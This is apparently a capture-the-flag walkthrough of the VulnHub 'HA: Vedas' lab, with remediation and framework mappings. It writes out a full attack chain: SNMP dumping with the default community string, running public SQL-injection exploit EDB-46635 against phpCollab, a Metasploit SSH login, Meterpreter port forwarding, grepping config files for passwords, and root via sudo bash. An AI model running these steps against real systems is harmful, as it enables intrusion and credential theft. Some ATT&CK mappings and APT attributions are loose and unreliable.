# HA: Vedas — Four Sacred Flags, One Sacred Grind

The Vedas are the oldest scriptures of Hinduism: four texts containing the knowledge of the universe. HA: Vedas mirrors this structure perfectly. Four flags hide across layered services, each requiring a different technique to surface. SNMP leaks the first. A custom CeWL wordlist and a public SQL injection exploit crack the second. Meterpreter port forwarding tunnels to an internal service for the third. And a lazy `sudo bash` gives you root and the fourth. Big brain box design, no cap.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | HA: Vedas |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/ha-vedas,376/ |
| **Techniques** | SNMP enumeration, CeWL custom wordlist, Dirb brute-force, SQL injection (EDB-46635), Metasploit Meterpreter, port forwarding, lateral movement, sudo bash privesc |
| **CVEs** | CWE-89 (SQL Injection), CWE-269 (Improper Privilege Management), CWE-284 (SNMP information disclosure) |
| **APT Groups** | APT41: exploits SNMP misconfigurations for lateral recon in telecom environments; APT34 (OilRig): uses web application SQL injection for initial access in Middle Eastern targets |

---

## Attack Summary

```
netdiscover + nmap (TCP + UDP)
  |
  +--> SNMP (UDP 161) → snmpwalk → Flag 1 (Rig Veda)
  |
  +--> HTTP (80) → CeWL wordlist → Dirb → /phpcollab/ login
          |
          +--> EDB-46635 SQLi → admin creds + Flag 2 (Yajur Veda)
          |
          +--> SSH login (Metasploit) → upgrade to Meterpreter
                    |
                    +--> portfwd → internal service → Flag 3 (Sama Veda)
                    |
                    +--> lateral move → vedas user
                              |
                              +--> sudo bash → root → Flag 4 (Atharva Veda)
```

---

## Methodology

1. Host discovery and full TCP + UDP scan
2. SNMP enumeration on UDP/161 for Flag 1
3. Custom wordlist generation with CeWL from the web page
4. Web directory brute-force with Dirb using the custom wordlist
5. SQL injection via public exploit (EDB-46635) to extract credentials and Flag 2
6. SSH login with Metasploit; upgrade shell to Meterpreter
7. Port forwarding via Meterpreter to access an internal service for Flag 3
8. Lateral movement to `vedas` user; `sudo bash` for root and Flag 4

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.0.0/24
# Target: 192.168.0.163

nmap -sV -sC -p- 192.168.0.163
nmap -sU -sV --top-ports 200 192.168.0.163
```

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.x
80/tcp  open  http    Apache httpd 2.4.x
161/udp open  snmp    SNMPv2c
```

UDP scan reveals SNMP on 161. That is a major recon surface. Most admins leave SNMP running with the default `public` community string.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — SNMP Enumeration: Flag 1 (Rig Veda)

```bash
snmpwalk -c public -v2c 192.168.0.163
```

Walk the entire MIB tree. Among the OID values, one entry contains the first flag:

```
Flag 1: Rig Veda — {found in SNMP OID output}
```

**Real-world note:** SNMP v1/v2c sends community strings in cleartext. Thousands of enterprise devices (routers, switches, printers, UPS systems) still run SNMP with the default `public` string. APT41 routinely uses SNMP enumeration as part of initial network reconnaissance in telecom intrusions.

**MITRE ATT&CK:** T1602.001 — Data from Configuration Repository: SNMP MIB Dump

---

## Step 3 — Custom Wordlist and Web Enumeration

Generate a wordlist from the target web page to feed directory brute-force:

```bash
cewl http://192.168.0.163/ -m 3 -w /tmp/vedas_wordlist.txt
wc -l /tmp/vedas_wordlist.txt
```

Run Dirb with the custom list:

```bash
dirb http://192.168.0.163/ /tmp/vedas_wordlist.txt
```

Discover `/phpcollab/` — a project management application running phpCollab.

```bash
# Also try standard lists
dirb http://192.168.0.163/ /usr/share/wordlists/dirb/common.txt
```

**Alternatively:** `gobuster dir -u http://192.168.0.163/ -w /tmp/vedas_wordlist.txt -x php,html,txt`

**Real-world note:** CeWL generates context-aware wordlists by scraping terminology from the target. This technique is highly effective against custom portals where admins set passwords related to the application's content.

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 4 — SQL Injection: Flag 2 (Yajur Veda)

phpCollab has a known SQL injection vulnerability in the login form, documented in Exploit-DB as EDB-46635:

```bash
searchsploit phpcollab
# Result: phpCollab 2.5.1 SQL Injection (EDB-46635)

searchsploit -m 46635
python 46635.py http://192.168.0.163/phpcollab/
```

The exploit dumps the users table, revealing admin credentials and the second flag embedded in a field:

```
Flag 2: Yajur Veda — {extracted from database}
Credentials: admin:[password]
```

Log into phpCollab at `http://192.168.0.163/phpcollab/` with the extracted credentials to confirm access.

**Real-world note:** phpCollab is actively used in enterprise project management. EDB-46635 is an unauthenticated SQL injection: no credentials needed, just network access. This class of vulnerability (unauthenticated SQLi in a management portal) is consistently exploited by APT34 for initial access.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1552.001 — Credentials in Files

---

## Step 5 — SSH Access and Meterpreter Upgrade

Use Metasploit's SSH login scanner to log in with the extracted credentials:

```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.0.163
set USERNAME admin
set PASSWORD [extracted_password]
run
```

After successful login, upgrade the session to Meterpreter:

```bash
sessions -u 1
sessions -i 2
```

Meterpreter gives you a stable, feature-rich session with port forwarding capabilities.

**MITRE ATT&CK:** T1021.004 — Remote Services: SSH; T1055 — Process Injection (via session upgrade)

---

## Step 6 — Port Forwarding: Flag 3 (Sama Veda)

Enumerate listening services on the target that are not exposed externally:

```bash
# In Meterpreter
run post/multi/recon/local_exploit_suggester
shell
ss -tlnp
# or
netstat -tlnp
```

Find an internal service (e.g., on port 8080 or another port not in the nmap output). Forward it locally:

```bash
# In Meterpreter
portfwd add -l 8888 -p [internal_port] -r 127.0.0.1
```

Now browse to `http://127.0.0.1:8888/` on the attacker machine. The internal service contains Flag 3:

```
Flag 3: Sama Veda — {found in internal web service}
```

**Real-world note:** Port forwarding via Meterpreter is one of the most powerful lateral movement primitives. Attackers use this to reach databases, admin panels, and internal APIs that are only accessible from localhost. APT41 used this technique extensively in 2019-2020 managed service provider compromises.

**MITRE ATT&CK:** T1090 — Proxy; T1021.001 — Remote Services: RDP (analogous tunneling concept)

---

## Step 7 — Lateral Movement and Root: Flag 4 (Atharva Veda)

Enumerate users on the system:

```bash
cat /etc/passwd | grep -v nologin | grep -v false
# Note: vedas user exists

# Look for credentials in the application config
find / -name "*.conf" -o -name "*.php" 2>/dev/null | xargs grep -l "password" 2>/dev/null
```

Switch to the `vedas` user (credentials found in application config or database dump), then check sudo rights:

```bash
su vedas
sudo -l
# (ALL : ALL) NOPASSWD: /bin/bash
```

```bash
sudo bash
id
# uid=0(root) gid=0(root) groups=0(root)

find / -name "*.txt" 2>/dev/null | grep -i veda
# or
cat /root/flag4.txt
```

```
Flag 4: Atharva Veda — ROOT
```

ᕕ( ᐛ )ᕗ All four Vedas collected.

**Real-world note:** `sudo bash` with NOPASSWD is the most trivially exploited sudo misconfiguration. It is functionally equivalent to giving the user passwordless root. This misconfiguration appears constantly in Linux systems that were not hardened after initial setup.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo; T1078.001 — Valid Accounts: Default Accounts

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Method |
|---|---|---|---|
| Flag 1 (Rig Veda) | (SNMP OID value) | SNMP UDP/161 | snmpwalk |
| Flag 2 (Yajur Veda) | (DB field) | phpCollab database | EDB-46635 SQLi |
| Credentials | admin:[password] | phpCollab users table | EDB-46635 SQLi |
| Flag 3 (Sama Veda) | (internal service) | localhost internal port | Meterpreter portfwd |
| Flag 4 (Atharva Veda) | (root flag) | /root/ | sudo bash |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | SNMP default community string `public` | Millions of enterprise devices expose SNMP with default strings | Disable SNMP v1/v2c; use SNMPv3 with authentication; firewall UDP/161 |
| 2 | phpCollab unauthenticated SQL injection (EDB-46635) | Unpatched CMS/project tools in intranets are consistently exploited | Patch and inventory all internal web applications; apply WAF rules |
| 3 | Internal service only on localhost, but accessible via tunneling | An attacker with any shell access can reach all localhost services | Defense in depth: encrypt and authenticate all internal services |
| 4 | `sudo bash` NOPASSWD | Single biggest Linux privesc finding; grants immediate root | Audit sudoers on every host; remove NOPASSWD for shells |
| 5 | Credential reuse from database to SSH | Extracted credentials worked for lateral movement | Unique passwords per service; no reuse between app DB and OS accounts |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Collection | Data from Configuration Repository: SNMP | T1602.001 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Command and Control | C2 | Proxy | T1090 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Privilege Escalation | Privilege Escalation | Valid Accounts | T1078.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Disable SNMP v1/v2c** — migrate to SNMPv3 with `authPriv` security level; firewall UDP/161 to monitoring hosts only
2. **Patch phpCollab** — upgrade to a supported version; apply EDB-46635 patch; consider replacing with a supported CMS
3. **Encrypt internal services** — even localhost services should require authentication; use TLS and API keys
4. **Remove NOPASSWD sudo** — especially for shells (`bash`, `sh`, `python`); require passwords for all sudo
5. **Isolate credentials** — application database passwords must never match OS user passwords

### MITRE D3FEND Countermeasures

- **D3-NTA** — Network Traffic Analysis (detect SNMP enumeration patterns)
- **D3-ACH** — Application Configuration Hardening (patch phpCollab; harden SNMP)
- **D3-OAM** — Operating System Administrative Management (sudo least privilege)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all SNMP-enabled devices; audit internal web applications |
| Protect | Access Control | Disable default SNMP community strings; restrict sudo to specific commands |
| Protect | Data Security | Encrypt credentials in transit; unique passwords per service |
| Detect | Anomalies and Events | Alert on SNMP mass-walk attempts; anomalous port forwarding connections |
| Respond | Response Planning | Patch phpCollab; rotate all extracted credentials; revoke affected SSH keys |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| CM-6 | Configuration Settings | Disable SNMP default community strings |
| CM-7 | Least Functionality | Disable unused services; restrict sudo |
| IA-5 | Authenticator Management | Unique credentials per service; rotate after breach |
| SC-7 | Boundary Protection | Firewall internal services; restrict SNMP to management VLANs |
| SI-2 | Flaw Remediation | Patch phpCollab; apply public exploit mitigations |

### CISA KEV

SQL injection vulnerabilities in management portals are consistently tracked in CISA KEV (AA21-116A, AA22-074A). Organizations running phpCollab or similar unpatched CMS applications should treat them as immediate remediation priorities per CISA guidance.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL2 |
| Identity and Access Management (IAM) | Manage Privileges | MIL3 |
| Asset, Change, and Configuration Management (ASSET) | Manage Asset Configuration | MIL2 |

---

## Final Thoughts

HA: Vedas is a legit multi-flag box that forces you to think differently for each stage. SNMP, SQLi, port forwarding, lateral movement: four distinct skills, four sacred flags. The Vedas theme is clever because this machine really does contain "layered knowledge": each service hides the key to the next.

The CeWL wordlist trick is the most educational part. Generating a custom list from the target itself and then finding the CMS with it is a technique that pays dividends in real engagements where standard wordlists fail.

Big respect to the HA series creator for consistently delivering themed boxes with real methodology depth.

Thanks guys!! (❍ᴥ❍ʋ)
